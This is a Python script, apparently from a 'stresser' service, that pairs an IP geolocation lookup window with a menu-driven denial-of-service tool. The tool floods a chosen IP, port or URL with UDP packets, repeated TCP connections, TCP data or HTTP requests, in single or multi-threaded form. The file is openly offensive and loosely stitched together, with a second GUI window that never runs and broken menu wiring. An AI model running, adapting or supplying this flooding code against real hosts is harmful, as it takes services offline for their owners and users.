import socket
import random
import time
import threading
import requests
from colorama import init, Fore
import tkinter as tk
from tkinter import messagebox

def nova_soubor():
    messagebox.showinfo("Info", "Nový soubor vytvořen!")

def otevrit_soubor():
    messagebox.showinfo("Info", "Otevřít soubor...")

def lookup_ip():
    ip = ip_entry.get().strip()
    if not ip:
        messagebox.showwarning("Input Error", "Please enter an IP address")
        return

    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()

        if data['status'] == 'success':
            result_text.set(
                f"IP: {data['query']}\n"
                f"Country: {data['country']}\n"
                f"Region: {data['regionName']}\n"
                f"City: {data['city']}\n"
                f"ZIP: {data['zip']}\n"
                f"ISP: {data['isp']}\n"
                f"Org: {data['org']}\n"
                f"Lat/Lon: {data['lat']}, {data['lon']}"
            )
        else:
            messagebox.showerror("Error", "IP not found or invalid")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to fetch data: {e}")

# GUI Setup
root = tk.Tk()
root.title("IP Lookup Tool")
root.geometry("400x300")

tk.Label(root, text="Enter IP Address:").pack(pady=10)
ip_entry = tk.Entry(root, width=30)
ip_entry.pack(pady=5)

tk.Button(root, text="Lookup", command=lookup_ip).pack(pady=10)

result_text = tk.StringVar()
result_label = tk.Label(root, textvariable=result_text, justify="left")
result_label.pack(pady=10)

root.mainloop()




root = tk.Tk()
root.title("ddos menu")
root.geometry("400x300")

# Vytvoření hlavního menu
menu_bar = tk.Menu(root)

# Soubor
soubor_menu = tk.Menu(menu_bar, tearoff=0)
soubor_menu.add_separator()
menu_bar.add_cascade(label="ip lookup", menu=soubor_menu, command=lookup_ip)

# Úpravy
upravy_menu = tk.Menu(menu_bar, tearoff=0)
upravy_menu.add_command(label="Kopírovat")
upravy_menu.add_command(label="Vložit")
menu_bar.add_cascade(label="Úpravy", menu=upravy_menu)

# Zobrazení
zobrazeni_menu = tk.Menu(menu_bar, tearoff=0)
zobrazeni_menu.add_command(label="FullScreen")
menu_bar.add_cascade(label="Zobrazení", menu=zobrazeni_menu)

# Nápověda
napoveda_menu = tk.Menu(menu_bar, tearoff=0)
napoveda_menu.add_command(label="O aplikaci")
menu_bar.add_cascade(label="Nápověda", menu=napoveda_menu)

# Připojení menu k hlavnímu oknu
root.config(menu=menu_bar)




# Initialize Colorama for colored output
init(autoreset=True)

# Set the window title
print(f"\033]0;Python DDOS V1.0 By elitestresser.club\007", end="", flush=True)

# UDP Flood Methods
def udp_plain_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = b"A" * packet_size  # Fixed payload

    print(Fore.LIGHTBLUE_EX + f"[*] Starting UDP Plain flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[!] Error during UDP Plain flood: {e}")
    finally:
        sock.close()
        print(Fore.LIGHTGREEN_EX + f"[+] UDP Plain flood complete! Sent {packet_count} packets.")

def udp_random_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0

    print(Fore.LIGHTBLUE_EX + f"[*] Starting UDP Random flood on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)  # Random payload
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[!] Error during UDP Random flood: {e}")
    finally:
        sock.close()
        print(Fore.LIGHTGREEN_EX + f"[+] UDP Random flood complete! Sent {packet_count} packets.")

# TCP Flood Methods
def tcp_syn_flood_single(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    end_time = time.time() + duration
    packet_count = 0

    print(Fore.LIGHTBLUE_EX + f"[*] Starting TCP SYN flood (Single) on {ip}:{port} for {duration} seconds...")
    try:
        while time.time() < end_time:
            sock.connect_ex((ip, port))  # SYN flood doesn't complete handshake
            packet_count += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # New socket each time
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[!] Error during TCP SYN flood (Single): {e}")
    finally:
        sock.close()
        print(Fore.LIGHTGREEN_EX + f"[+] TCP SYN flood (Single) complete! Sent {packet_count} SYN packets.")

def tcp_syn_flood_multi(ip, port, duration):
    end_time = time.time() + duration
    packet_count = [0]  # List to share count across threads

    def syn_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        while time.time() < end_time:
            try:
                sock.connect_ex((ip, port))
                packet_count[0] += 1
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            except:
                pass
        sock.close()

    print(Fore.LIGHTBLUE_EX + f"[*] Starting TCP SYN flood (Multi-threaded) on {ip}:{port} for {duration} seconds...")
    threads = [threading.Thread(target=syn_worker) for _ in range(10)]  # 10 threads
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(Fore.LIGHTGREEN_EX + f"[+] TCP SYN flood (Multi-threaded) complete! Sent {packet_count[0]} SYN packets.")

def tcp_data_flood_single(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = random.randbytes(packet_size)

    print(Fore.LIGHTBLUE_EX + f"[*] Starting TCP Data flood (Single) on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(payload)
            packet_count += 1
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[!] Error during TCP Data flood (Single): {e}")
    finally:
        sock.close()
        print(Fore.LIGHTGREEN_EX + f"[+] TCP Data flood (Single) complete! Sent {packet_count} packets.")

def tcp_data_flood_multi(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = [0]

    def data_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        payload = random.randbytes(packet_size)
        try:
            sock.connect((ip, port))
            while time.time() < end_time:
                sock.send(payload)
                packet_count[0] += 1
        except:
            pass
        sock.close()

    print(Fore.LIGHTBLUE_EX + f"[*] Starting TCP Data flood (Multi-threaded) on {ip}:{port} with {packet_size}-byte packets for {duration} seconds...")
    threads = [threading.Thread(target=data_worker) for _ in range(10)]  # 10 threads
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(Fore.LIGHTGREEN_EX + f"[+] TCP Data flood (Multi-threaded) complete! Sent {packet_count[0]} packets.")

# HTTP Flood Method
def http_flood(url, duration):
    end_time = time.time() + duration
    request_count = 0

    print(Fore.LIGHTBLUE_EX + f"[*] Starting HTTP flood on {url} for {duration} seconds...")
    try:
        while time.time() < end_time:
            requests.get(url, timeout=1)
            request_count += 1
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[!] Error during HTTP flood: {e}")
    print(Fore.LIGHTGREEN_EX + f"[+] HTTP flood complete! Sent {request_count} requests.")

# Validation Function
def validate_input(prompt, min_val, max_val, input_type=int):
    while True:
        try:
            value = input_type(input(Fore.LIGHTBLUE_EX + prompt))
            if min_val <= value <= max_val:
                return value
            print(Fore.LIGHTRED_EX + f"[!] Value must be between {min_val} and {max_val}.")
        except ValueError:
            print(Fore.LIGHTRED_EX + "[!] Invalid input. Please enter a number.")

def main():
    # Print header when tool runs
    print(Fore.LIGHTGREEN_EX + "Made by elitestresser.club")
    print(Fore.LIGHTBLUE_EX + "=== Network Flood Tool ===")
    print("Protocols:")
    print("1. UDP")
    print("2. TCP")
    print("3. HTTP")
    
    protocol = input(Fore.LIGHTBLUE_EX + "Select protocol (1-3): ").strip()

    if protocol == "1":  # UDP
        print(Fore.LIGHTBLUE_EX + "\nUDP Methods:")
        print("1. UDP Plain (Fixed payload)")
        print("2. UDP Random (Random payload)")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-2): ").strip()

        ip = input(Fore.LIGHTBLUE_EX + "Enter server IP: ")
        port = validate_input("Enter port (1-65535): ", 1, 65535)
        duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)
        packet_size = validate_input("Enter packet size in bytes (1-65500): ", 1, 65500)

        if method == "1":
            udp_plain_flood(ip, port, duration, packet_size)
        elif method == "2":
            udp_random_flood(ip, port, duration, packet_size)
        else:
            print(Fore.LIGHTRED_EX + "[!] Invalid UDP method.")

    elif protocol == "2":  # TCP
        print(Fore.LIGHTBLUE_EX + "\nTCP Methods:")
        print("1. TCP SYN Flood (Sends SYN packets)")
        print("2. TCP Data Flood (Sends data after connection)")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-2): ").strip()

        ip = input(Fore.LIGHTBLUE_EX + "Enter server IP: ")
        port = validate_input("Enter port (1-65535): ", 1, 65535)
        duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)

        print(Fore.LIGHTBLUE_EX + "Execution Style:")
        print("1. Single (One socket)")
        print("2. Multi-threaded (10 threads)")
        style = input(Fore.LIGHTBLUE_EX + "Select style (1-2): ").strip()

        if method == "1":
            if style == "1":
                tcp_syn_flood_single(ip, port, duration)
            elif style == "2":
                tcp_syn_flood_multi(ip, port, duration)
            else:
                print(Fore.LIGHTRED_EX + "[!] Invalid TCP SYN style.")
        elif method == "2":
            packet_size = validate_input("Enter packet size in bytes (1-65500): ", 1, 65500)
            if style == "1":
                tcp_data_flood_single(ip, port, duration, packet_size)
            elif style == "2":
                tcp_data_flood_multi(ip, port, duration, packet_size)
            else:
                print(Fore.LIGHTRED_EX + "[!] Invalid TCP Data style.")
        else:
            print(Fore.LIGHTRED_EX + "[!] Invalid TCP method.")

    elif protocol == "3":  # HTTP
        url = input(Fore.LIGHTBLUE_EX + "Enter URL (e.g., http://example.com): ")
        duration = validate_input("Enter flood duration in seconds: ", 1, float('inf'), float)
        http_flood(url, duration)

    else:
        print(Fore.LIGHTRED_EX + "[!] Invalid protocol selected.")

if __name__ == "__main__":
    main()
